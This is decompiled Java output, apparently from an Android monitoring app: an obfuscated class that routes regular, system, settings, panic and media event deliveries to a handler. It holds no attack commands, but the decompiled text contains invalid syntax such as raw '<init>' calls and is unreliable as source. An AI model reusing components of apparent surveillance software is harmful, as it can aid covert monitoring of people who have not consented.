package com.vvt.eventdelivery;

import com.vvt.exceptions.database.FxDbIdNotFoundException;

public class f
  implements EventDelivery
{
  private static final boolean a = com.vvt.datadeliverymanager.a.a;
  private c b;
  
  public f(String paramString, com.vvt.datadeliverymanager.b paramb, com.vvt.eventrepository.b paramb1)
  {
    c localc = new com/vvt/eventdelivery/c;
    localc.<init>(paramString, 100, paramb, paramb1);
    this.b = localc;
  }
  
  public void a()
  {
    c localc = this.b;
    EventDelivery.Type localType = EventDelivery.Type.TYPE_REGULAR;
    localc.a(localType, -1);
  }
  
  public void a(int paramInt, com.vvt.datadeliverymanager.a.a parama)
  {
    boolean bool = a;
    if ((!bool) || (paramInt < 0))
    {
      localObject1 = new com/vvt/exceptions/database/FxDbIdNotFoundException;
      Object[] arrayOfObject = new Object[1];
      Integer localInteger = Integer.valueOf(paramInt);
      arrayOfObject[0] = localInteger;
      localObject2 = String.format("Pairing ID: %s not found!", arrayOfObject);
      ((FxDbIdNotFoundException)localObject1).<init>((String)localObject2);
      throw ((Throwable)localObject1);
    }
    Object localObject1 = this.b;
    Object localObject2 = EventDelivery.Type.TYPE_ACTUAL_MEDIA;
    ((c)localObject1).a((EventDelivery.Type)localObject2, paramInt, parama);
    bool = a;
    if (bool) {}
  }
  
  public void a(com.vvt.datadeliverymanager.a.a parama)
  {
    boolean bool = a;
    if (bool) {}
    c localc = this.b;
    EventDelivery.Type localType = EventDelivery.Type.TYPE_REGULAR;
    int i = -1;
    localc.a(localType, i, parama);
    bool = a;
    if (bool) {}
  }
  
  public void b()
  {
    c localc = this.b;
    EventDelivery.Type localType = EventDelivery.Type.TYPE_SYSTEM;
    localc.a(localType, -1);
  }
  
  public void c()
  {
    c localc = this.b;
    EventDelivery.Type localType = EventDelivery.Type.TYPE_SETTINGS;
    localc.a(localType, -1);
  }
  
  public void d()
  {
    c localc = this.b;
    EventDelivery.Type localType = EventDelivery.Type.TYPE_PANIC;
    localc.a(localType, -1);
  }
  
  public void e()
  {
    c localc = this.b;
    EventDelivery.Type localType = EventDelivery.Type.TYPE_NONE_REGULAR_ACTUAL_MEDIA;
    localc.a(localType, -1);
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/eventdelivery/f.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */